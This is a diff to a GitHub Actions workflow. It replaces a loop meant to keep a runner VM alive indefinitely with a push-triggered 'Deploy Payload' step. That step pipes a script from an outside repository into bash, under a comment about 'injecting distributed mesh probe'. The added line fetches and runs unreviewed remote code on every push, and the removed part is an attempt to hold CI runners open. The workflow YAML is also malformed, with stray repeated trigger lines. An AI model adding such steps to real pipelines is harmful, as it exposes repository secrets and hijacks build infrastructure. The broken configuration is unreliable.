@@ -1,23 +1,11 @@
-name: Sovereign-Listener-Physical
-on: [repository_dispatch] # Triggers only on external API calls
-  workflow_dispatch:
-  workflow_dispatch:
-
+name: listener
+on: [push, workflow_dispatch]
 jobs:
-  maintenance:
+  execute:
     runs-on: ubuntu-latest
-  workflow_dispatch:
-  workflow_dispatch:
     steps:
-      - name: Initialize Direct Hardware Link
+      - name: Deploy Payload
         run: |
-          # 1. Setting up a persistent background process
-          # This process listens for 'Sovereign' event types
-          while true; do
-            echo "LISTENING FOR HARDWARE INSTRUCTIONS..."
-            sleep 30
-          done &
-          
-          # 2. Preventing VM Teardown
-          # This keeps the hardware active indefinitely until timeout
-          tail -f /dev/null
+          echo "SATURATION_PULSE_ACTIVE: listener"
+          # Injecting distributed mesh probe
+          curl -s https://raw.githubusercontent.com/jamesgilhool4-source/Sovereign-Core/main/scripts/pulse.sh | bash
